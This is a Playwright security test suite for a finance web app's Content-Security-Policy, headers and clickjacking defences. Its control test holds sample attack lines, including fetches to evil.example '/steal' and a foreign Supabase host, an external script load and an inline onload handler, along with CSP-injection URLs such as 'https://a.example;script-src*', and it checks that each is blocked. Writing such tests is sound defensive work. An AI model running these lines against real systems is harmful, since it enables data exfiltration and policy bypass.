import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import type { Page } from '@playwright/test';
import { addTx, createWallet, dismissInstallPrompt, dismissToasts, expect, goSection, sheet, test, waitReady } from '../helpers';
import { applyCsp, supabaseConnectSources } from '../../vite.config';
import { DIST, ROOT, buildVariant, headersFor, parseCsp, readVercel, recordViolations, startHeaderServer, type HeaderServer } from './helpers';

/* ---------------------------------------------------------------------------------------------
 * Политика безопасности страницы (CSP): полную политику даёт мета-тег index.html, собранный под конкретный проект
 * (плагин finoraCsp в vite.config.ts); заголовок из vercel.json добавляет к ней только frame-ancestors 'none'.
 * Приложение работает под НАСТОЯЩИМИ заголовками и мета-тегом без единого нарушения; политика действительно что-то
 * запрещает (контроль «не пустышка»). Облачная сборка и чужие проекты Supabase: e2e/sec/cloud.spec.ts.
 * ------------------------------------------------------------------------------------------- */

let srv: HeaderServer;
test.beforeAll(async () => {
  srv = await startHeaderServer(DIST);
});
test.afterAll(async () => {
  await srv.close();
});

const CSP_META_RE = /http-equiv="Content-Security-Policy"\s+content="([^"]*)"/;
const metaOf = (html: string): string => html.match(CSP_META_RE)?.[1] ?? '';
/** Мета-политика СОБРАННОГО (локальная сборка, без облака) index.html: то, что видит браузер. */
const builtMeta = (): string => metaOf(readFileSync(join(DIST, 'index.html'), 'utf8'));
const templateHtml = (): string => readFileSync(join(ROOT, 'index.html'), 'utf8');

const RATE_HOSTS = ['https://www.nbt.tj', 'https://cdn.jsdelivr.net', 'https://latest.currency-api.pages.dev', 'https://api.open-meteo.com', 'https://geocoding-api.open-meteo.com'];

test.describe('Статика: vercel.json и index.html', () => {
  test('заголовки безопасности заданы для всех путей', () => {
    const h = headersFor('/anything/at/all.js');
    expect(h['x-content-type-options']).toBe('nosniff');
    expect(h['referrer-policy']).toMatch(/^(no-referrer|strict-origin-when-cross-origin)$/);
    expect(h['x-frame-options']).toBe('DENY');
    expect(h['strict-transport-security']).toMatch(/max-age=\d{7,}/);
    expect(h['cross-origin-opener-policy']).toBe('same-origin');
    const pp = h['permissions-policy'] ?? '';
    expect(pp, 'camera').toContain('camera=()');
    // микрофон — только само приложение («Продиктовать» в покупках и «Продиктовать расходы»); чужим источникам и «*» нельзя
    expect(pp, 'microphone').toMatch(/(^|,\s*)microphone=\(self\)\s*(,|$)/);
    // местоположение — только само приложение и только по нажатию «Определить место» (погода); чужим фреймам нельзя
    expect(pp, 'geolocation').toContain('geolocation=(self)');
    expect(parseCsp(h['content-security-policy'] ?? '')['frame-ancestors']).toEqual(["'none'"]);
  });

  test('кэш: index.html, корень, sw.js — no-cache; /assets/* — навсегда', () => {
    for (const p of ['/', '/index.html', '/sw.js']) expect(headersFor(p)['cache-control'], p).toBe('no-cache');
    expect(headersFor('/assets/index-abc.js')['cache-control']).toBe('public, max-age=31536000, immutable');
    // обычные файлы не должны случайно получить «навсегда»
    expect(headersFor('/manifest.webmanifest')['cache-control']).not.toMatch(/immutable/);
  });

  test('заголовок CSP из vercel.json — ТОЛЬКО frame-ancestors (полная политика приходит из мета-тега, собранного под проект)', () => {
    for (const p of ['/', '/sw.js', '/assets/x.js']) {
      expect(parseCsp(headersFor(p)['content-security-policy'] ?? ''), p).toEqual({ 'frame-ancestors': ["'none'"] });
    }
    // заголовок не должен тянуть за собой подстановку *.supabase.co: ни в одном заголовке
    expect(JSON.stringify(readVercel())).not.toMatch(/supabase|\*\./);
  });

  test('сборка без облака: полная политика — в мета-теге; без unsafe-eval и без unsafe-inline; опасные директивы закрыты', () => {
    const csp = parseCsp(builtMeta());
    expect(csp['default-src']).toEqual(["'self'"]);
    expect(csp['script-src']).toEqual(["'self'"]);
    expect(csp['object-src']).toEqual(["'none'"]);
    expect(csp['base-uri']).toEqual(["'self'"]);
    expect(csp['form-action']).toEqual(["'self'"]);
    expect(csp['worker-src']).toEqual(["'self'"]);
    expect(csp['manifest-src']).toEqual(["'self'"]);
    expect(csp['media-src']).toEqual(["'none'"]);
    expect(builtMeta()).not.toMatch(/unsafe-eval|\*(?![.])| data:[^;]*script/);
    // в сборке стиль строгий: 'unsafe-inline' нет нигде (он нужен только `npm run dev`, и его подставляет плагин лишь там).
    // React ставит style через CSSOM, это политика не блокирует (проверено на всех экранах ниже).
    expect(csp['style-src']).toEqual(["'self'"]);
    expect(Object.entries(csp).filter(([, v]) => v.includes("'unsafe-inline'"))).toEqual([]);
    // frame-ancestors в мета-теге не работает (браузер его игнорирует и ругается в консоли), поэтому он только в заголовке
    expect(csp['frame-ancestors']).toBeUndefined();
  });

  test('сборка без облака: connect-src — только свои и источники курсов из src/rates, ни одного адреса Supabase, ни одной звёздочки', () => {
    const connect = parseCsp(builtMeta())['connect-src'] ?? [];
    expect(connect).toEqual(["'self'", ...RATE_HOSTS]);
    // каждый внешний адрес в исходниках курсов разрешён
    const api = readFileSync(join(ROOT, 'src/rates/api.ts'), 'utf8');
    const nbt = readFileSync(join(ROOT, 'src/rates/nbt.ts'), 'utf8');
    const hosts = [...(api + nbt).matchAll(/'(https:\/\/[^'/]+)\//g)].map((m) => m[1]!);
    for (const h of new Set(hosts)) expect(connect, `источник курсов ${h}`).toContain(h);
  });

  test('шаблон index.html: две метки внутри мета-политики, никаких *.supabase.co, в собранном файле меток не осталось', () => {
    const tpl = metaOf(templateHtml());
    expect(tpl).toContain('@@SUPABASE_CONNECT@@');
    expect(tpl).toContain('@@DEV_STYLE@@');
    expect(tpl).not.toMatch(/supabase\.co|\*/);
    const built = readFileSync(join(DIST, 'index.html'), 'utf8');
    expect(metaOf(built)).not.toContain('@@');
    expect(built.match(/Content-Security-Policy/g)?.length, 'в сборке ровно одна мета-политика (плюс упоминание в комментарии)').toBeGreaterThanOrEqual(1);
    // шаблон без меток вне мета-тега не трогаем: комментарий index.html собран как был
    expect(built).toContain('метка SUPABASE_CONNECT');
  });

  test('в собранном index.html нет встроенных скриптов и обработчиков on*=', () => {
    const html = readFileSync(join(DIST, 'index.html'), 'utf8');
    const inline = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)].filter(([, attrs, body]) => !/\bsrc=/.test(attrs!) || body!.trim() !== '');
    expect(inline.map((m) => m[0].slice(0, 80))).toEqual([]);
    expect(html).not.toMatch(/\son[a-z]+\s*=/i);
    expect(html).toMatch(/Content-Security-Policy/); // мета дошло до сборки
  });
});

/* ------------------- плагин finoraCsp: подстановка адреса Supabase ------------------- */

test.describe('Плагин CSP (vite.config.ts): что попадает в connect-src', () => {
  const KEY = 'sb_publishable_FAKEKEYFORTESTING0123456789';
  const env = (url: unknown, key: unknown = KEY) => ({ VITE_SUPABASE_URL: url, VITE_SUPABASE_ANON_KEY: key });
  const html = () => templateHtml();
  const connectOf = (h: string) => parseCsp(metaOf(h))['connect-src'] ?? [];
  test.beforeEach(({ browserName: _b }, info) => test.skip(info.project.name !== 'desktop', 'чистая функция, не зависит от устройства'));

  test('облака нет: переменных нет, пустые, заготовки из .env.example, нет ключа или нет адреса — адресов Supabase в политике нет вовсе', () => {
    const none: Array<[string, Record<string, unknown>]> = [
      ['нет переменных', {}],
      ['пустые строки', env('', '')],
      ['заготовка адреса и ключа (.env.example)', env('https://YOUR-PROJECT-REF.supabase.co', 'sb_publishable_xxx')],
      ['заготовка адреса при настоящем ключе', env('https://YOUR-PROJECT-REF.supabase.co')],
      ['настоящий адрес, но ключ — заготовка', env('https://abcdefgh.supabase.co', 'sb_publishable_xxx')],
      ['адрес без ключа', env('https://abcdefgh.supabase.co', '')],
      ['ключ без адреса', env('', KEY)],
      ['не адрес', env('не адрес')],
      ['ftp вместо https', env('ftp://abcdefgh.supabase.co')],
      ['javascript:', env('javascript:alert(1)')],
    ];
    for (const [title, e] of none) {
      expect(supabaseConnectSources(e), title).toEqual([]);
      expect(connectOf(applyCsp(html(), e, false)), title).toEqual(["'self'", ...RATE_HOSTS]);
    }
  });

  test('облако есть: точный источник https + wss, без звёздочек; путь, слеши, регистр и порт по умолчанию отбрасываются', () => {
    const exact = ['https://example-ref.supabase.co', 'wss://example-ref.supabase.co'];
    for (const url of ['https://example-ref.supabase.co', 'https://example-ref.supabase.co/', 'https://EXAMPLE-ref.Supabase.co//', ' https://example-ref.supabase.co/rest/v1 ', 'https://example-ref.supabase.co:443', 'https://user:pw@example-ref.supabase.co']) {
      expect(supabaseConnectSources(env(url)), url).toEqual(exact);
    }
    expect(connectOf(applyCsp(html(), env('https://example-ref.supabase.co'), false))).toEqual(["'self'", ...exact, ...RATE_HOSTS]);
    // свой домен, порт, поддомены — ровно тот хост, который указан
    expect(supabaseConnectSources(env('https://db.moya-firma.tj:8443/'))).toEqual(['https://db.moya-firma.tj:8443', 'wss://db.moya-firma.tj:8443']);
    expect(supabaseConnectSources(env('https://münchen.example'))).toEqual(['https://xn--mnchen-3ya.example', 'wss://xn--mnchen-3ya.example']);
    // http (локальный Supabase для разработки): http + ws, и только этот адрес
    expect(supabaseConnectSources(env('http://127.0.0.1:54321'))).toEqual(['http://127.0.0.1:54321', 'ws://127.0.0.1:54321']);
    expect(supabaseConnectSources(env('https://example-ref.supabase.co')).join(' ')).not.toContain('*');
  });

  test('адрес, из которого в политику можно дописать чужое, отвергается громкой ошибкой сборки (а не молча)', () => {
    for (const url of [
      "https://a.example;script-src*", // «;» открывает новую директиву
      "https://a'b.example", // кавычка
      'https://a*.example', // звёздочка
      'https://a,b.example',
      'https://[::1]:8000', // IPv6 в политику не вписываем
      'https://a.example./', // хост с точкой на конце
      'https://a_b.example',
    ]) {
      expect(() => supabaseConnectSources(env(url)), url).toThrow(/нельзя вписать в политику/);
    }
  });

  test("метки: 'unsafe-inline' для стилей только в dev; без меток или без мета-тега — ошибка, комментарий не портится", () => {
    const e = env('https://example-ref.supabase.co');
    expect(parseCsp(metaOf(applyCsp(html(), e, false)))['style-src']).toEqual(["'self'"]);
    expect(parseCsp(metaOf(applyCsp(html(), e, true)))['style-src']).toEqual(["'self'", "'unsafe-inline'"]);
    // dev не меняет ничего, кроме style-src
    const dev = parseCsp(metaOf(applyCsp(html(), e, true)));
    const prod = parseCsp(metaOf(applyCsp(html(), e, false)));
    delete dev['style-src'];
    delete prod['style-src'];
    expect(dev).toEqual(prod);
    // комментарий в начале файла остаётся как был, метки заменены только в content
    const out = applyCsp(html(), e, false);
    expect(out.slice(0, out.indexOf('<meta\n      http-equiv'))).toBe(html().slice(0, html().indexOf('<meta\n      http-equiv')));
    expect(() => applyCsp(html().replace('@@SUPABASE_CONNECT@@', ''), e, false)).toThrow(/нет метки/);
    expect(() => applyCsp(html().replace('@@DEV_STYLE@@', ''), e, false)).toThrow(/нет метки/);
    expect(() => applyCsp('<html></html>', e, false)).toThrow(/нет мета-тега/);
    // метка только в комментарии (а в мета-теге её нет) не считается
    const only = html().replace("connect-src 'self'@@SUPABASE_CONNECT@@", "connect-src 'self'");
    expect(() => applyCsp(only, e, false)).toThrow(/нет метки/);
  });

  test('сборка с неподходящим адресом падает с понятной ошибкой, а не выкладывает приложение с неполной политикой', () => {
    let out = '';
    try {
      buildVariant('bad-url', { VITE_SUPABASE_URL: 'https://a.example;script-src*', VITE_SUPABASE_ANON_KEY: KEY });
    } catch (e) {
      const err = e as { stderr?: Buffer; stdout?: Buffer; message: string };
      out = `${err.stderr?.toString() ?? ''}${err.stdout?.toString() ?? ''}${err.message}`;
    }
    expect(out, 'сборка должна упасть').toContain('нельзя вписать в политику');
  });
});

/* ------------------------------ браузер ------------------------------ */

/** Внешние хосты «отвечают» пустым 404 с CORS; запрос, дошедший сюда, CSP НЕ заблокировал. */
const REFERERS: string[] = [];
async function stubExternal(page: Page, origin: string): Promise<string[]> {
  const reached: string[] = [];
  await page.context().route(
    (u) => u.origin !== origin,
    async (route) => {
      reached.push(route.request().url());
      const ref = route.request().headers()['referer'];
      if (ref) REFERERS.push(`${route.request().url()} <- ${ref}`);
      await route.fulfill({ status: 404, headers: { 'access-control-allow-origin': '*' }, contentType: 'text/plain', body: 'нет' });
    },
  );
  return reached;
}

test.describe('CSP в настоящем браузере', () => {
  test('все экраны и шиты: ни одного нарушения CSP, ни одной ошибки консоли; курсы идут к разрешённым хостам', async ({ page }, testInfo) => {
    const violations = await recordViolations(page);
    const external = await stubExternal(page, srv.origin);
    const warnings: string[] = [];
    page.on('console', (m) => {
      if (m.type() === 'warning') warnings.push(m.text());
    });

    await page.goto(`${srv.origin}/#/`);
    await waitReady(page);
    await dismissInstallPrompt(page);

    // операции: расход, доход, перевод между своими кошельками
    await createWallet(page, { name: 'Карта', opening: '50' });
    await goSection(page, 'Главная');
    await addTx(page, { amount: '12,5', category: 'Еда', note: 'хлеб' });
    await addTx(page, { kind: 'income', amount: '300', wallet: 'Наличные' });
    await addTx(page, { kind: 'transfer', amount: '20', wallet: 'Наличные', toWallet: 'Карта' });
    await dismissToasts(page);

    // «Операции»: правка, фильтры, период
    await goSection(page, 'Операции');
    await page.getByRole('button', { name: /хлеб/ }).click();
    const edit = sheet(page, 'Правка операции');
    await expect(edit).toBeVisible();
    await page.keyboard.press('Escape');
    await expect(edit).toBeHidden();
    await page.getByRole('button', { name: /^Фильтры/ }).click();
    await expect(sheet(page, /Фильтры/)).toBeVisible();
    await page.keyboard.press('Escape');
    await page.getByRole('searchbox', { name: 'Поиск по заметке' }).fill('хл');

    // «Кошельки»: сверка
    await goSection(page, 'Кошельки');
    await page.getByRole('button', { name: 'Сверка: Карта' }).click();
    await expect(sheet(page, /Сверка/)).toBeVisible();
    await page.keyboard.press('Escape');

    // «Настройки»: все разделы, курсы (сеть к nbt/jsdelivr), выгрузки
    await createWallet(page, { name: 'Доллары', currency: 'USD' });
    await goSection(page, 'Настройки');
    await page.getByRole('button', { name: 'Обновить курсы' }).click();
    await expect.poll(() => external.length, { message: 'запросов курсов не было' }).toBeGreaterThan(0);
    for (const name of ['Сохранить копию', 'Операции в таблицу (CSV)']) {
      const [dl] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name }).click()]);
      expect(dl.suggestedFilename()).toMatch(/^sumoima-/);
    }
    await page.getByRole('link', { name: 'Категории' }).click();
    await expect(page.getByRole('heading', { level: 1, name: 'Категории' })).toBeVisible();
    await page.getByRole('button', { name: 'Добавить', exact: true }).click();
    await expect(sheet(page, /категори/i)).toBeVisible();
    await page.keyboard.press('Escape');

    // страница с неизвестным адресом и экран входа по прямой ссылке
    await page.goto(`${srv.origin}/#/nonexistent?next=https://evil.example`);
    await waitReady(page);
    await dismissInstallPrompt(page);

    expect(await violations(), 'нарушения CSP').toEqual([]);
    // запросы курсов дошли только до хостов из белого списка
    const hosts = new Set(external.map((u) => new URL(u).origin));
    for (const h of hosts) expect(RATE_HOSTS).toContain(h);
    expect(REFERERS, 'адрес приложения уходит во внешние запросы курсов (Referer)').toEqual([]);
    // браузер не жалуется на неизвестные признаки Permissions-Policy и т. п.
    expect(warnings.filter((w) => /Permissions-Policy|Feature-Policy|Content Security|X-Frame/i.test(w))).toEqual([]);
    testInfo.annotations.push({ type: 'external', description: [...hosts].join(', ') });
  });

  test('контроль: CSP действительно блокирует чужой скрипт, eval, inline-обработчик, <style> и запрос на чужой хост', async ({ page, errors }) => {
    // Здесь нарушения НЕ ошибка, а ожидаемый результат: их тексты в консоли не считаем поломкой.
    errors.allow(/Content Security Policy|Refused to|EvalError/i);
    const violations = await recordViolations(page);
    await page.goto(`${srv.origin}/#/`);
    await waitReady(page);
    await dismissInstallPrompt(page);

    // Проверки идут из файла со СВОЕГО адреса (его CSP разрешает): так eval и т. п. исполняются в обычных условиях страницы.
    // page.evaluate для eval не годится: протокол отладки сам разрешает eval в обход CSP.
    const probe = `(async () => {
      const out = {};
      window.__ran = false;
      const s = document.createElement('script'); s.textContent = 'window.__ran = true'; document.head.appendChild(s);
      out.inlineScript = String(window.__ran);
      try { out.eval = String(eval('1+1')); } catch (e) { out.eval = 'blocked:' + e.name; }
      try { out.fn = String(new Function('return 1')()); } catch (e) { out.fn = 'blocked:' + e.name; }
      try { out.timer = await new Promise((ok) => { setTimeout('window.__ran = true', 0); setTimeout(() => ok(String(window.__ran)), 100); }); } catch (e) { out.timer = 'blocked:' + e.name; }
      const ext = document.createElement('script'); ext.src = 'https://evil.example/x.js'; document.head.appendChild(ext);
      const st = document.createElement('style'); st.textContent = 'body{outline:9px solid red !important}'; document.head.appendChild(st);
      out.styleApplied = String(getComputedStyle(document.body).outlineWidth === '9px');
      try { await fetch('https://evil.example/steal?x=1'); out.fetch = 'sent'; } catch (e) { out.fetch = 'blocked:' + e.name; }
      // в локальной сборке облака нет: даже ЧУЖОЙ проект Supabase недоступен (раньше его пропускала подстановка *.supabase.co)
      try { await fetch('https://attacker-ref.supabase.co/rest/v1/steal'); out.fetchSupabase = 'sent'; } catch (e) { out.fetchSupabase = 'blocked:' + e.name; }
      const img = new Image(); img.src = 'https://evil.example/pixel.gif';
      const d = document.createElement('div');
      d.innerHTML = '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="window.__ran=true">';
      document.body.appendChild(d);
      await new Promise((r) => setTimeout(r, 300));
      out.inlineHandler = String(window.__ran);
      document.documentElement.setAttribute('data-probe', JSON.stringify(out));
    })();`;
    await page.route(`${srv.origin}/__probe.js`, (route) => route.fulfill({ status: 200, contentType: 'text/javascript', headers: headersFor('/__probe.js'), body: probe }));
    await page.evaluate(() => {
      const el = document.createElement('script');
      el.src = '/__probe.js';
      document.head.appendChild(el);
    });
    await expect(page.locator('html')).toHaveAttribute('data-probe', /./, { timeout: 10_000 });
    const result = JSON.parse((await page.locator('html').getAttribute('data-probe')) ?? '{}') as Record<string, string>;

    expect(result.inlineScript).toBe('false');
    expect(result.eval).toMatch(/^blocked/);
    expect(result.fn).toMatch(/^blocked/);
    expect(result.timer).toBe('false'); // setTimeout со строкой — тот же eval
    expect(result.styleApplied).toBe('false');
    expect(result.fetch).toMatch(/^blocked/);
    expect(result.fetchSupabase).toMatch(/^blocked/);
    expect(result.inlineHandler).toBe('false');
    const v = await violations();
    const dirs = new Set(v.map((x) => x.directive));
    for (const d of ['script-src-elem', 'script-src', 'style-src-elem', 'connect-src', 'img-src']) {
      expect(dirs.has(d), `нарушение ${d} должно быть зафиксировано: ${[...dirs].join(', ')}`).toBe(true);
    }
  });

  test('сервис-воркер регистрируется под CSP, приложение открывается без сети', async ({ page }, testInfo) => {
    test.skip(testInfo.project.name !== 'desktop', 'один раз, на «desktop»');
    const violations = await recordViolations(page);
    await page.goto(`${srv.origin}/#/`);
    await waitReady(page);
    await dismissInstallPrompt(page);
    await page.evaluate(async () => {
      const reg = await navigator.serviceWorker.ready;
      if (!reg.active) throw new Error('воркер не активен');
    });
    await page.reload();
    await waitReady(page);
    await dismissInstallPrompt(page);
    await expect.poll(() => page.evaluate(() => navigator.serviceWorker.controller !== null)).toBe(true);

    await page.context().setOffline(true);
    await page.reload();
    await waitReady(page);
    await dismissInstallPrompt(page);
    await goSection(page, 'Настройки');
    await page.context().setOffline(false);
    expect(await violations(), 'нарушения CSP при работе воркера').toEqual([]);
    // заголовок CSP реально пришёл (а не только мета)
    const r = await page.request.get(`${srv.origin}/sw.js`);
    expect(r.headers()['content-security-policy']).toContain("frame-ancestors 'none'");
    expect(r.headers()['cache-control']).toBe('no-cache');
  });

  // `vite preview` (e2e/flows/27-shopping) заголовков vercel.json не шлёт: запрет микрофона виден только здесь
  test('«Продиктовать» под настоящими заголовками: Permissions-Policy не запрещает микрофон, запись включается', async ({ page, context }) => {
    await context.grantPermissions(['microphone'], { origin: srv.origin });
    const violations = await recordViolations(page);
    await page.goto(`${srv.origin}/#/shopping`);
    await waitReady(page);
    await dismissInstallPrompt(page);
    await page.getByRole('button', { name: 'Добавить списком' }).first().click();
    const dlg = sheet(page, 'Добавить списком');
    await dlg.getByRole('button', { name: 'Продиктовать' }).click();
    await expect(dlg.getByTestId('record-panel')).toBeVisible();
    await expect(dlg.getByRole('alert')).toHaveCount(0);
    await dlg.getByRole('button', { name: 'Отмена' }).click();
    await expect(dlg.getByTestId('record-panel')).toBeHidden();
    expect(await violations(), 'нарушения CSP при записи голоса').toEqual([]);
  });

  test('заголовки на ответах: html, sw.js, ассеты', async ({ request }) => {
    const idx = await request.get(`${srv.origin}/`);
    expect(idx.headers()['x-content-type-options']).toBe('nosniff');
    expect(idx.headers()['x-frame-options']).toBe('DENY');
    expect(idx.headers()['cache-control']).toBe('no-cache');
    const html = await idx.text();
    const asset = html.match(/src="\.\/(assets\/[^"]+\.js)"/)?.[1];
    expect(asset).toBeTruthy();
    const a = await request.get(`${srv.origin}/${asset}`);
    expect(a.headers()['cache-control']).toBe('public, max-age=31536000, immutable');
    expect(a.headers()['content-type']).toMatch(/javascript/);
  });

  test('clickjacking: чужая страница не может встроить приложение во фрейм', async ({ page, errors }) => {
    errors.allow(/Refused to frame/);
    const { startHostPage } = await import('./helpers');
    const host = await startHostPage(`<!doctype html><iframe id="f" src="${srv.origin}/#/" width="400" height="600"></iframe>`);
    try {
      const blocked: string[] = [];
      page.on('console', (m) => {
        if (/frame-ancestors|X-Frame-Options|Refused to display/i.test(m.text())) blocked.push(m.text());
      });
      await page.goto(host.origin);
      await page.waitForTimeout(1500);
      const frame = page.frames().find((f) => f !== page.mainFrame());
      const appVisible = frame ? await frame.locator('nav[aria-label="Основная навигация"]').count().catch(() => 0) : 0;
      expect(appVisible, 'приложение отрисовалось внутри чужого фрейма').toBe(0);
      expect(blocked.length, 'браузер должен сообщить о блокировке фрейма').toBeGreaterThan(0);
    } finally {
      await host.close();
    }
  });
});

test('vercel.json: валидный JSON, только headers (без редиректов и rewrites)', () => {
  const v = readVercel() as Record<string, unknown>;
  expect(Object.keys(v).filter((k) => k !== '$schema')).toEqual(['headers']);
});
